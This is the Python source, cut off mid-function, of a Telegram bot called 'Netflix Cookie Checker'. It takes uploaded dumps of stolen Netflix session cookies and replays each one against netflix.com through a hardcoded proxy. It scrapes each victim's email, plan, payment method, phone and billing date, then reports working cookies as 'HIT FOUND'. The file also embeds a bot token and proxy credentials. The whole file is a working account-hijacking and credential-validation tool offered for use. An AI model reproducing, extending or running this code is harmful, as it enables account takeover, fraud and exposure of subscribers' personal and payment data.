import asyncio
import io
import itertools
import json
import logging
import os
import re
import tempfile
import threading
import time
import zipfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
from typing import List, Optional

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    filters, ContextTypes, CallbackQueryHandler,
)
from telegram.constants import ParseMode

try:
    import rarfile
    HAS_RAR = True
except ImportError:
    HAS_RAR = False

BOT_TOKEN = "8415677590:AAFf3UvXwQF6GN6thuASKoaOs351hNTtQSo"
THREADS = 25
DEFAULT_PROXY_STR = "zxoproxy.pw:6969:pika:chika"
CREDIT = "@sarthakhere69"
DIV = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

ADMIN_IDS = [8003049490]
ALLOWED_USERS_FILE = "ncc_allowed_users.json"

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

active_jobs: dict = {}
active_jobs_lock = threading.Lock()


def load_allowed_users() -> list:
    if os.path.exists(ALLOWED_USERS_FILE):
        try:
            with open(ALLOWED_USERS_FILE, "r") as f:
                return json.load(f)
        except Exception:
            pass
    return []


def save_allowed_users(users: list):
    with open(ALLOWED_USERS_FILE, "w") as f:
        json.dump(users, f, indent=2)


def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS


def is_allowed(user_id: int, username: str = None) -> bool:
    if is_admin(user_id):
        return True
    allowed = load_allowed_users()
    for entry in allowed:
        if isinstance(entry, dict):
            if entry.get("id") == user_id:
                return True
            if username and entry.get("username", "").lower() == username.lower().lstrip("@"):
                return True
        elif isinstance(entry, int) and entry == user_id:
            return True
    return False


def _build_proxy_dict(proxy_str: str) -> dict:
    parts = proxy_str.strip().split(":")
    if len(parts) == 4:
        host, port, user, password = parts
        url = f"http://{user}:{password}@{host}:{port}"
    elif len(parts) == 2:
        host, port = parts
        url = f"http://{host}:{port}"
    else:
        url = f"http://{proxy_str}"
    return {"http": url, "https": url}


DEFAULT_PROXIES = _build_proxy_dict(DEFAULT_PROXY_STR)


def esc(text: str) -> str:
    if not isinstance(text, str):
        text = str(text)
    special = r"\_*[]()~`>#+-=|{}.!"
    for c in special:
        text = text.replace(c, f"\\{c}")
    return text


MONTH_MAP = {
    "enero": 1, "febrero": 2, "marzo": 3, "abril": 4, "mayo": 5, "junio": 6,
    "julio": 7, "agosto": 8, "septiembre": 9, "octubre": 10, "noviembre": 11, "diciembre": 12,
    "janeiro": 1, "fevereiro": 2, "março": 3, "marco": 3, "maio": 5, "junho": 6,
    "julho": 7, "setembro": 9, "outubro": 10, "novembro": 11, "dezembro": 12,
    "janvier": 1, "février": 2, "fevrier": 2, "mars": 3, "avril": 4, "mai": 5, "juin": 6,
    "juillet": 7, "août": 8, "aout": 8, "octobre": 10, "novembre": 11, "décembre": 12, "decembre": 12,
    "januar": 1, "februar": 2, "märz": 3, "marz": 3, "juni": 6, "juli": 7,
    "oktober": 10, "dezember": 12,
    "gennaio": 1, "febbraio": 2, "aprile": 4, "maggio": 5, "giugno": 6,
    "luglio": 7, "settembre": 9, "ottobre": 10,
    "januari": 1, "februari": 2, "maret": 3, "mei": 5,
    "agustus": 8, "desember": 12,
    "mart": 3, "nisan": 4, "mayis": 5, "haziran": 6, "temmuz": 7,
    "ekim": 10, "aralik": 12,
}


def _parse_localized_date(billing_str: str) -> Optional[datetime]:
    billing_lower = billing_str.lower().strip()
    billing_lower = re.sub(r"\bde\b", "", billing_lower).strip()
    billing_lower = re.sub(r"\s+", " ", billing_lower)
    for month_name, month_num in MONTH_MAP.items():
        if month_name in billing_lower:
            digits = re.findall(r"\d+", billing_lower)
            if len(digits) >= 2:
                nums = [int(d) for d in digits]
                year_candidates = [n for n in nums if n > 1000]
                day_candidates = [n for n in nums if 1 <= n <= 31]
                if year_candidates and day_candidates:
                    try:
                        return datetime(year_candidates[0], month_num, day_candidates[0])
                    except ValueError:
                        pass
    return None


def _decode_unicode(s: str) -> str:
    if not isinstance(s, str):
        return s
    if "\\u" not in s and "\\x" not in s:
        return s
    try:
        return s.encode("raw_unicode_escape").decode("unicode_escape")
    except Exception:
        return s


def _clean_value(val: str) -> str:
    if not isinstance(val, str):
        return val
    val = _decode_unicode(val)
    val = val.replace("\\x20", " ").strip()
    return val


def calc_days_remaining(billing_str: str) -> str:
    if not billing_str or billing_str == "Unknown":
        return "N/A"
    billing_str = _clean_value(billing_str).strip().rstrip(".")
    ts_m = re.match(r"^(\d{10,13})$", billing_str)
    if ts_m:
        ts = int(ts_m.group(1))
        if ts > 1e12:
            ts /= 1000
        try:
            billing_date = datetime.fromtimestamp(ts)
            delta = (billing_date - datetime.now()).days
            return "Expired" if delta < 0 else f"{delta} days"
        except (OSError, ValueError):
            pass
    for fmt in [
        "%Y-%m-%d", "%B %d, %Y", "%B %d %Y", "%d %B %Y", "%m/%d/%Y",
        "%d/%m/%Y", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%dT%H:%M:%S.%f",
        "%Y-%m-%dT%H:%M:%SZ", "%Y-%m-%dT%H:%M:%S.%fZ",
        "%b %d, %Y", "%b %d %Y", "%d %b %Y", "%d-%m-%Y", "%m-%d-%Y",
    ]:
        try:
            billing_date = datetime.strptime(billing_str, fmt)
            delta = (billing_date - datetime.now()).days
            return "Expired" if delta < 0 else f"{delta} days"
        except ValueError:
            continue
    loc_date = _parse_localized_date(billing_str)
    if loc_date:
        delta = (loc_date - datetime.now()).days
        return "Expired" if delta < 0 else f"{delta} days"
    return billing_str


def _extract_from_dict(data: dict):
    nfid = data.get("NetflixId", "") or data.get("netflixId", "") or data.get("netflix_id", "")
    snfid = data.get("SecureNetflixId", "") or data.get("secureNetflixId", "") or data.get("secure_netflix_id", "")
    if not nfid:
        name = data.get("name", "")
        value = data.get("value", "")
        if name == "NetflixId":
            return value, ""
        elif name == "SecureNetflixId":
            return "", value
    return nfid, snfid


def parse_cookies(raw_input: str):
    raw = raw_input.strip()
    if not raw:
        return "", ""

    if raw.startswith("["):
        try:
            items = json.loads(raw)
            nfid, snfid = "", ""
            for item in items:
                if isinstance(item, dict):
                    n, s = _extract_from_dict(item)
                    if n:
                        nfid = n
                    if s:
                        snfid = s
            return nfid, snfid
        except json.JSONDecodeError:
            pass

    if raw.startswith("{"):
        try:
            data = json.loads(raw)
            if "cookies" in data and isinstance(data["cookies"], list):
                nfid, snfid = "", ""
                for item in data["cookies"]:
                    if isinstance(item, dict):
                        n, s = _extract_from_dict(item)
                        if n:
                            nfid = n
                        if s:
                            snfid = s
                return nfid, snfid
            return _extract_from_dict(data)
        except json.JSONDecodeError:
            pass

    nfid = ""
    snfid = ""
    for line in raw.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7:
            name = parts[5]
            value = parts[6]
            if name == "NetflixId":
                nfid = value
            elif name == "SecureNetflixId":
                snfid = value
        elif "NetflixId" in line and "=" in line:
            for segment in line.split(";"):
                segment = segment.strip()
                if segment.startswith("NetflixId="):
                    nfid = segment.split("=", 1)[1]
                elif segment.startswith("SecureNetflixId="):
                    snfid = segment.split("=", 1)[1]

    return nfid, snfid


def check_cookie(nfid: str, snfid: str = "", proxy: dict = None) -> dict:
    result = {
        "valid": False,
        "has_sub": False,
        "plan": "Unknown",
        "country": "Unknown",
        "email": "Unknown",
        "member_since": "Unknown",
        "next_billing": "Unknown",
        "max_streams": "Unknown",
        "video_quality": "Unknown",
        "payment_method": "Unknown",
        "phone": "Unknown",
        "profiles": [],
        "error": None,
    }

    if not nfid:
        result["error"] = "NetflixId missing"
        return result

    session = requests.Session()
    session.headers["User-Agent"] = UA
    retry_cfg = Retry(
        total=4,
        backoff_factor=1.5,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET"],
        raise_on_status=False,
    )
    adapter = HTTPAdapter(max_retries=retry_cfg)
    session.mount("https://", adapter)
    session.mount("http://", adapter)

    used_proxy = proxy if proxy else DEFAULT_PROXIES
    session.proxies.update(used_proxy)

    session.cookies.set("NetflixId", nfid, domain=".netflix.com", path="/")
    if snfid:
        session.cookies.set("SecureNetflixId", snfid, domain=".netflix.com", path="/")

    r = None
    for _attempt in range(4):
        try:
            r = session.get("https://www.netflix.com/browse", allow_redirects=True, timeout=20)
            break
        except (requests.ConnectionError, requests.Timeout) as e:
            if _attempt < 3:
                time.sleep(2 ** _attempt)
                continue
            result["error"] = f"Network error: {str(e)[:80]}"
            return result
        except requests.RequestException as e:
            result["error"] = f"Network error: {str(e)[:80]}"
            return result

    if r is None:
        result["error"] = "Connection failed after retries"
        return result

    if r.status_code != 200:
        result["error"] = f"HTTP {r.status_code}"
        return result

    if "/login" in r.url or "/LoginHelp" in r.url:
        result["error"] = "Expired / Invalid"
        return result

    page_lower = r.text.lower()[:5000]
    no_sub_signals = [
        "/signup" in r.url,
        "choose your plan" in page_lower,
        "finish signing up" in page_lower,
        "restart your membership" in page_lower,
        "rejoin" in page_lower and "plan" in page_lower,
        "your membership has been canceled" in page_lower,
        "resubscribe" in page_lower,
    ]
    if any(no_sub_signals):
        result["valid"] = True
        result["has_sub"] = False
        result["plan"] = "No Active Subscription"
        return result

    build_ids = re.findall(r'"BUILD_IDENTIFIER":"([^"]+)"', r.text)
    auth_urls = re.findall(r'"authURL":"([^"]+)"', r.text)

    if not build_ids or not auth_urls:
        if "login" in r.text.lower()[:2000]:
            result["error"] = "Expired / Invalid"
        else:
            result["error"] = "Could not extract session data"
        return result

    result["valid"] = True
    build_id = build_ids[0]
    auth_url = auth_urls[0].encode().decode("unicode_escape")

    country_m = re.findall(r'"currentCountry":"([^"]+)"', r.text)
    if country_m:
        result["country"] = country_m[0]

    try:
        account_r = session.get("https://www.netflix.com/account", timeout=20)
        if account_r.status_code == 200:
            _extract_account_info(account_r.text, result)
    except requests.RequestException:
        pass

    api_root = f"https://www.netflix.com/api/shakti/{build_id}"
    try:
        profiles_r = session.get(
            f"{api_root}/profiles",
            params={"authURL": auth_url},
            headers={"Accept": "application/json"},
            timeout=15,
        )
        if profiles_r.status_code == 200:
            try:
                pdata = profiles_r.json()
                profile_list = []
                for p in pdata.get("profiles", []):
                    profile_list.append(p.get("firstName", p.get("profileName", "Unknown")))
                if profile_list:
                    result["profiles"] = profile_list
            except (json.JSONDecodeError, ValueError):
                pass
    except requests.RequestException:
        pass

    _classify_plan(result)

    for key in ["plan", "country", "email", "member_since", "next_billing", "payment_method", "phone", "video_quality"]:
        if key in result:
            result[key] = _clean_value(result[key])
    if "plan_price" in result:
        result["plan_price"] = _clean_value(result["plan_price"])
    if result.get("profiles"):
        result["profiles"] = [_clean_value(p) for p in result["profiles"]]

    return result


def _extract_account_info(html: str, result: dict):
    plan_m = re.findall(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"', html)
    if not plan_m:
        plan_m = re.findall(r'"GrowthPlan","name":"([^"]+)"', html)
    if not plan_m:
        plan_m = re.findall(r'data-uia="plan-label"[^>]*>([^<]+)', html)
    if not plan_m:
        plan_m = re.findall(r'"planName":"([^"]+)"', html)
    if plan_m:
        result["plan"] = plan_m[0].strip()

    email_m = re.findall(r'"email":\{"__typename":"GrowthClearStringValue","value":"([^"]+)"', html)
    if not email_m:
        email_m = re.findall(r'"email":\{[^}]*"value"\s*:\s*"([^"]+)"', html)
    if not email_m:
        email_m = re.findall(r'"memberEmail":"([^"]+)"', html)
    if not email_m:
        email_m = re.findall(r'data-uia="account-email"[^>]*>([^<]+)', html)
    if not email_m:
        email_m = re.findall(r'"email":"([^"]+)"', html)
    if email_m:
        val = _clean_value(email_m[0].strip())
        if val and "@" in val:
            result["email"] = val

    since_m = re.findall(r'"memberSince":"([^"]+)"', html)
    if not since_m:
        since_m = re.findall(r'data-uia="member-since"[^>]*>([^<]+)', html)
    if since_m:
        result["member_since"] = since_m[0].strip()

    billing_patterns = [
        r'"nextBillingDate":\{"fieldType":"[^"]+","value":"([^"]+)"',
        r'"nextBillingDate":\{[^}]*"value"\s*:\s*"([^"]+)"',
        r'"nextBillingDate":"([^"]+)"',
        r'data-uia="nextBillingDate[^"]*"[^>]*>([^<]+)',
        r'"currentPeriodEndDate":\{[^}]*"value"\s*:\s*"([^"]+)"',
        r'"currentPeriodEndDate":"([^"]+)"',
        r'"billingDate"\s*:\s*"([^"]+)"',
        r'"renewalDate"\s*:\s*"([^"]+)"',
        r'"nextRenewalDate"\s*:\s*"([^"]+)"',
        r'"subscriptionEndDate"\s*:\s*"([^"]+)"',
        r'Your next billing date is\s+([A-Z][a-z]+ \d{1,2},?\s*\d{4})',
        r'Next (?:payment|billing)[: ]+([A-Z][a-z]+ \d{1,2},?\s*\d{4})',
        r'"formattedNextBillingDate"\s*:\s*"([^"]+)"',
        r'"nextBillingDateFormatted"\s*:\s*"([^"]+)"',
    ]
    for pat in billing_patterns:
        billing_m = re.findall(pat, html)
        if billing_m:
            result["next_billing"] = billing_m[0].strip()
            break

    streams_m = re.findall(r'"maxStreams":\s*(\d+)', html)
    if not streams_m:
        streams_m = re.findall(r'"numOfAllowedStreams":\s*(\d+)', html)
    if streams_m:
        result["max_streams"] = streams_m[0]

    quality_m = re.findall(r'"videoQuality":"([^"]+)"', html)
    if not quality_m:
        quality_m = re.findall(r'"streamQuality":"([^"]+)"', html)
    if quality_m:
        result["video_quality"] = quality_m[0]

    payment_type = re.findall(r'"type":\{"fieldType":"String","value":"([^"]+)"\}[^}]*"paymentMethod"', html)
    payment_method = re.findall(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"', html)
    if payment_type and payment_method:
        result["payment_method"] = f"{payment_type[0]} ({payment_method[0]})"
    elif payment_type:
        result["payment_method"] = payment_type[0]
    elif payment_method:
        result["payment_method"] = payment_method[0]
    else:
        pm = re.findall(r'"paymentType":"([^"]+)"', html)
        if not pm:
            pm = re.findall(r'data-uia="payment-type"[^>]*>([^<]+)', html)
        if pm:
            result["payment_method"] = pm[0].strip()

    phone_m = re.findall(r'"phoneNumber":"([^"]+)"', html)
    if phone_m:
        result["phone"] = phone_m[0]

    price_m = re.findall(r'"planPrice":"([^"]+)"', html)
    if not price_m:
        price_m = re.findall(r'"formattedPrice":"([^"]+)"', html)
    if price_m:
        result["plan_price"] = price_m[0]

    country_m = re.findall(r'"currentCountry":"([^"]+)"', html)
    if not country_m:
        country_m = re.findall(r'"countryOfSignUp":\{[^}]*"code"\s*:\s*"([^"]+)"', html)
    if country_m:
        result["country"] = country_m[0]

    profiles_html = re.findall(r'"profileName":"([^"]+)"', html)
    if profiles_html and not result["profiles"]:
        result["profiles"] = list(set(profiles_html))


def _classify_plan(result: dict):
    plan_lower = result.get("plan", "").lower()
    streams = result.get("max_streams", "")
    billing = result.get("next_billing", "Unknown")
    payment = result.get("payment_method", "Unknown")

    no_sub_keywords = ["no active", "canceled", "cancelled", "expired", "free",
                       "no subscription", "inactive", "not subscribed"]
    if any(kw in plan_lower for kw in no_sub_keywords):
        result["has_sub"] = False
        return

    has_plan = plan_lower and plan_lower != "unknown"
    has_streams = str(streams) not in ("", "Unknown", "0")
    has_billing = billing and billing != "Unknown"
    has_payment = payment and payment != "Unknown"

    score = sum([has_plan, has_streams, has_billing, has_payment])
    if score >= 2:
        result["has_sub"] = True
    elif has_plan and any(t in plan_lower for t in ["standard", "premium", "basic", "mobile", "ads", "essentiel", "estándar", "padrão", "standaard"]):
        result["has_sub"] = True
    elif has_billing and has_payment:
        result["has_sub"] = True
    else:
        result["has_sub"] = False


def load_cookies_from_content(content: str, source_name: str = "") -> List[str]:
    cookies = []
    content = content.strip()
    if not content:
        return cookies

    if content.startswith("{") or content.startswith("["):
        cookies.append(content)
        return cookies

    if "\t" in content and ".netflix.com" in content:
        cookies.append(content)
        return cookies

    if "NetflixId=" in content and "SecureNetflixId=" in content:
        cookies.append(content)
        return cookies

    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if "NetflixId" in line:
            cookies.append(line)

    if not cookies and content:
        cookies.append(content)

    return cookies


def load_cookies_from_txt_content(content: str) -> List[str]:
    cookies = []
    lines = content.strip().splitlines()

    if not lines:
        return cookies

    json_lines = [l.strip() for l in lines if l.strip().startswith("{")]
    if len(json_lines) > 1:
        return json_lines

    if content.strip().startswith("["):
        cookies.append(content.strip())
        return cookies

    if content.strip().startswith("{"):
        cookies.append(content.strip())
        return cookies

    netscape_blocks = []
    current_block = []
    for line in lines:
        line_s = line.strip()
        if not line_s or line_s.startswith("#"):
            if current_block:
                netscape_blocks.append("\n".join(current_block))
                current_block = []
            continue
        parts = line_s.split("\t")
        if len(parts) >= 7:
            current_block.append(line_s)
        elif "NetflixId" in line_s and "=" in line_s:
            cookies.append(line_s)
        else:
            if current_block:
                current_block.append(line_s)
    if current_block:
        netscape_blocks.append("\n".join(current_block))

    for block in netscape_blocks:
        if "NetflixId" in block:
            cookies.append(block)

    if not cookies and content.strip():
        cookies.append(content.strip())

    return cookies


def extract_cookies_from_zip(data: bytes) -> List[str]:
    cookies = []
    try:
        with zipfile.ZipFile(io.BytesIO(data)) as zf:
            for name in zf.namelist():
                if name.endswith("/"):
                    continue
                lower = name.lower()
                if lower.endswith((".txt", ".json", ".cookie", ".cookies")):
                    try:
                        raw = zf.read(name).decode("utf-8", errors="replace")
                        cookies.extend(load_cookies_from_content(raw, name))
                    except Exception:
                        pass
    except zipfile.BadZipFile:
        pass
    except Exception:
        pass
    return cookies


def extract_cookies_from_rar(data: bytes) -> List[str]:
    if not HAS_RAR:
        return []
    cookies = []
    try:
        with tempfile.NamedTemporaryFile(suffix=".rar", delete=False) as tmp:
            tmp.write(data)
            tmp_path = tmp.name
        try:
            with rarfile.RarFile(tmp_path) as rf:
                for info in rf.infolist():
                    lower = info.filename.lower()
                    if lower.endswith((".txt", ".json", ".cookie", ".cookies")):
                        try:
                            raw = rf.read(info.filename).decode("utf-8", errors="replace")
                            cookies.extend(load_cookies_from_content(raw, info.filename))
                        except Exception:
                            pass
        finally:
            os.unlink(tmp_path)
    except Exception:
        pass
    return cookies


def format_hit_result(result: dict, nfid: str, snfid: str) -> str:
    email = result.get("email", "Unknown")
    plan = result.get("plan", "Unknown")
    quality = result.get("video_quality", "")
    plan_display = f"{plan} ({quality})" if quality and quality != "Unknown" else plan
    country = result.get("country", "Unknown")
    max_streams = result.get("max_streams", "Unknown")
    days = calc_days_remaining(result.get("next_billing"))
    payment = result.get("payment_method", "Unknown")
    profiles = ", ".join(result.get("profiles", [])) or "N/A"

    cookie_str = f"NetflixId={nfid}"
    if snfid:
        cookie_str += f"; SecureNetflixId={snfid}"

    lines = [
        f"Email: {email} | Plan: {plan_display} | Country: {country} | "
        f"Max Streams: {max_streams} | Days Remaining: {days} | "
        f"Payment: {payment} | Profiles: {profiles}",
        f"Cookie: {cookie_str}",
        f"made by {CREDIT}",
        "─" * 60,
    ]
    return "\n".join(lines)


def format_hit_tg(result: dict, nfid: str, snfid: str) -> str:
    email = result.get("email", "Unknown")
    plan = result.get("plan", "Unknown")
    quality = result.get("video_quality", "")
    plan_display = f"{plan} ({quality})" if quality and quality != "Unknown" else plan
    country = result.get("country", "Unknown")
    max_streams = result.get("max_streams", "Unknown")
    days = calc_days_remaining(result.get("next_billing"))
    payment = result.get("payment_method", "Unknown")
    profiles = ", ".join(result.get("profiles", [])) or "N/A"
    member_since = result.get("member_since", "Unknown")

    cookie_str = f"NetflixId={nfid}"
    if snfid:
        cookie_str += f"; SecureNetflixId={snfid}"

    msg = (
        f"✅ *HIT FOUND*\n"
        f"{DIV}\n"
        f"📧 `{email}`\n"
        f"📺 *Plan:* `{plan_display}`\n"
        f"🌍 *Country:* `{country}`\n"
        f"🖥 *Max Streams:* `{max_streams}`\n"
        f"📅 *Days Left:* `{days}`\n"
        f"💳 *Payment:* `{payment}`\n"
        f"👤 *Profiles:* `{profiles}`\n"
        f"📆 *Member Since:* `{member_since}`\n"
        f"{DIV}\n"
        f"🍪 *Cookie:*\n`{cookie_str}`\n"
        f"{DIV}\n"
        f"_{CREDIT}_"
    )
    return msg


def progress_bar(done: int, total: int, width: int = 15) -> str:
    if total == 0:
        return "░" * width
    filled = int(width * done / total)
    pct = int(100 * done / total)
    return "▓" * filled + "░" * (width - filled) + f"  {pct}%"


async def _deny(update: Update):
    await update.message.reply_text(
        "🚫 *Access Denied*\n"
        f"{DIV}\n"
        "You don't have permission to use this bot\\.\n"
        "Contact the admin to request access\\.",
        parse_mode=ParseMode.MARKDOWN_V2,
    )


async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid = user.id
    uname = user.username or ""

    if not is_allowed(uid, uname):
        await update.message.reply_text(
            "🚫 *Access Denied*\n"
            f"{DIV}\n"
            "You don't have permission to use this bot\\.\n"
            "Contact the admin to request access\\.",
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        return

    text = (
        f"🎬 *Netflix Cookie Checker*\n"
        f"{DIV}\n"
        f"Send me cookies to check in any of these ways:\n\n"
        f"📄 *File Upload* — Send a `.txt`, `.zip`, or `.rar` file containing cookies\n"
        f"✏️ *Direct Text* — Paste cookie text directly in chat\n\n"
        f"*Supported Cookie Formats:*\n"
        f"• `NetflixId=...` or `NetflixId=...; SecureNetflixId=...`\n"
        f"• JSON array / object format\n"
        f"• Netscape cookie format\n\n"
        f"{DIV}\n"
        f"🔧 *Settings:*\n"
        f"• Threads: `{THREADS}`\n"
        f"• Proxy: `{DEFAULT_PROXY_STR}`\n"
        f"{DIV}\n"
        f"_{CREDIT}_"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_allowed(user.id, user.username or ""):
        await _deny(update)
        return

    admin_section = ""
    if is_admin(user.id):
        admin_section = (
            f"\n*Admin Commands:*\n"
            f"*/adduser <id or @username>* — Grant access\n"
            f"*/removeuser <id or @username>* — Revoke access\n"
            f"*/users* — List all allowed users\n"
        )

    text = (
        f"📖 *Help & Commands*\n"
        f"{DIV}\n"
        f"*/start* — Show welcome message\n"
        f"*/help* — Show this help\n"
        f"*/cancel* — Cancel running job\n"
        f"{admin_section}\n"
        f"*How to check cookies:*\n"
        f"1️⃣ Upload a `.txt` file with one cookie per line\n"
        f"2️⃣ Upload a `.zip` or `.rar` archive with cookie files inside\n"
        f"3️⃣ Paste cookie text directly in chat\n\n"
        f"*Capture Format (Hit):*\n"
        f"`Email | Plan | Country | Streams | Days | Payment | Profiles`\n"
        f"{DIV}\n"
        f"_{CREDIT}_"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)


async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_allowed(user.id, user.username or ""):
        await _deny(update)
        return

    uid = user.id
    with active_jobs_lock:
        if uid in active_jobs:
            active_jobs[uid]["cancelled"] = True
            await update.message.reply_text("⛔ *Cancellation requested.* Job will stop after current batch.", parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("ℹ️ No active job to cancel.")


async def cmd_adduser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("🚫 Admin only command\\.", parse_mode=ParseMode.MARKDOWN_V2)
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            "❌ *Usage:* `/adduser <user_id or @username>`",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    target = args[0].strip()
    allowed = load_allowed_users()

    if target.lstrip("@").isdigit() or (target.startswith("-") and target[1:].isdigit()):
        target_id = int(target.lstrip("@"))
        for entry in allowed:
            if isinstance(entry, dict) and entry.get("id") == target_id:
                await update.message.reply_text(f"ℹ️ User `{target_id}` already has access\\.", parse_mode=ParseMode.MARKDOWN_V2)
                return
            elif isinstance(entry, int) and entry == target_id:
                await update.message.reply_text(f"ℹ️ User `{target_id}` already has access\\.", parse_mode=ParseMode.MARKDOWN_V2)
                return
        allowed.append({"id": target_id, "username": "", "added_by": uid})
        save_allowed_users(allowed)
        await update.message.reply_text(f"✅ User `{target_id}` has been granted access\\.", parse_mode=ParseMode.MARKDOWN_V2)
    elif target.startswith("@"):
        uname = target.lstrip("@").lower()
        for entry in allowed:
            if isinstance(entry, dict) and entry.get("username", "").lower() == uname:
                await update.message.reply_text(f"ℹ️ `@{uname}` already has access\\.", parse_mode=ParseMode.MARKDOWN_V2)
                return
        allowed.append({"id": None, "username": uname, "added_by": uid})
        save_allowed_users(allowed)
        await update.message.reply_text(f"✅ `@{uname}` has been granted access\\.", parse_mode=ParseMode.MARKDOWN_V2)
    else:
        await update.message.reply_text("❌ Provide a numeric user ID or @username\\.", parse_mode=ParseMode.MARKDOWN_V2)


async def cmd_removeuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("🚫 Admin only command\\.", parse_mode=ParseMode.MARKDOWN_V2)
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            "❌ *Usage:* `/removeuser <user_id or @username>`",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    target = args[0].strip()
    allowed = load_allowed_users()
    original_len = len(allowed)

    if target.lstrip("@").isdigit():
        target_id = int(target.lstrip("@"))
        allowed = [
            e for e in allowed
            if not (isinstance(e, dict) and e.get("id") == target_id)
            and not (isinstance(e, int) and e == target_id)
        ]
        label = f"`{target_id}`"
    elif target.startswith("@"):
        uname = target.lstrip("@").lower()
        allowed = [
            e for e in allowed
            if not (isinstance(e, dict) and e.get("username", "").lower() == uname)
        ]
        label = f"`@{uname}`"
    else:
        await update.message.reply_text("❌ Provide a numeric user ID or @username\\.", parse_mode=ParseMode.MARKDOWN_V2)
        return

    if len(allowed) < original_len:
        save_allowed_users(allowed)
        await update.message.reply_text(f"✅ {label} access has been revoked\\.", parse_mode=ParseMode.MARKDOWN_V2)
    else:
        await update.message.reply_text(f"ℹ️ {label} was not in the allowed list\\.", parse_mode=ParseMode.MARKDOWN_V2)


async def cmd_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("🚫 Admin only command\\.", parse_mode=ParseMode.MARKDOWN_V2)
        return

    allowed = load_allowed_users()

    if not allowed:
        await update.message.reply_text(
            f"👥 *Allowed Users*\n{DIV}\nNo users have been granted access yet\\.",
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        return

    lines = [f"👥 *Allowed Users* — `{len(allowed)}` total\n{DIV}"]
    for i, entry in enumerate(allowed, 1):
        if isinstance(entry, dict):
            eid = entry.get("id")
            euname = entry.get("username", "")
            parts = []
            if eid:
                parts.append(f"ID: `{eid}`")
            if euname:
                parts.append(f"@{euname}")
            lines.append(f"{i}\\. " + "  ·  ".join(parts) if parts else f"{i}\\. Unknown")
        elif isinstance(entry, int):
            lines.append(f"{i}\\. ID: `{entry}`")

    lines.append(f"{DIV}\n_{CREDIT}_")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN_V2)


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_allowed(user.id, user.username or ""):
        await _deny(update)
        return

    text = update.message.text.strip()
    if not text:
        return

    uid = user.id
    with active_jobs_lock:
        if uid in active_jobs:
            await update.message.reply_text("⚠️ You already have a running job\\. Use /cancel to stop it\\.", parse_mode=ParseMode.MARKDOWN_V2)
            return

    cookies = load_cookies_from_txt_content(text)
    if not cookies:
        cookies = load_cookies_from_content(text)

    if not cookies:
        await update.message.reply_text("❌ Could not parse any cookies from the text you sent\\.", parse_mode=ParseMode.MARKDOWN_V2)
        return

    await run_check_job(update, context, cookies, source="text input")


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_allowed(user.id, user.username or ""):
        await _deny(update)
        return

    doc = update.message.document
    if not doc:
        return

    uid = user.id
    with active_jobs_lock:
        if uid in active_jobs:
            await update.message.reply_text("⚠️ You already have a running job\\. Use /cancel to stop it\\.", parse_mode=ParseMode.MARKDOWN_V2)
            return

    fname = doc.file_name or ""
    fname_lower = fname.lower()

    allowed_exts = (".txt", ".json", ".cookie", ".cookies", ".zip", ".rar")
    if not any(fname_lower.endswith(ext) for ext in allowed_exts):
        await update.message.reply_text(
            "❌ Unsupported file type\\. Please send a `.txt`, `.zip`, or `.rar` file\\.",
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        return

    status_msg = await update.message.reply_text("📥 *Downloading file…*", parse_mode=ParseMode.MARKDOWN)

    try:
        tg_file = await doc.get_file()
        file_data = await tg_file.download_as_bytearray()
        file_bytes = bytes(file_data)
    except Exception as e:
        await status_msg.edit_text(f"❌ Failed to download file: {e}")
        return

    if fname_lower.endswith(".zip"):
        await status_msg.edit_text("🗜 *Extracting ZIP…*", parse_mode=ParseMode.MARKDOWN)
        cookies = extract_cookies_from_zip(file_bytes)
    elif fname_lower.endswith(".rar"):
        await status_msg.edit_text("🗜 *Extracting RAR…*", parse_mode=ParseMode.MARKDOWN)
        if not HAS_RAR:
            await status_msg.edit_text("❌ RAR support not available\\. Install `rarfile` and `unrar`\\.", parse_mode=ParseMode.MARKDOWN_V2)
            return
        cookies = extract_cookies_from_rar(file_bytes)
    else:
        content = file_bytes.decode("utf-8", errors="replace")
        cookies = load_cookies_from_txt_content(content)
        if not cookies:
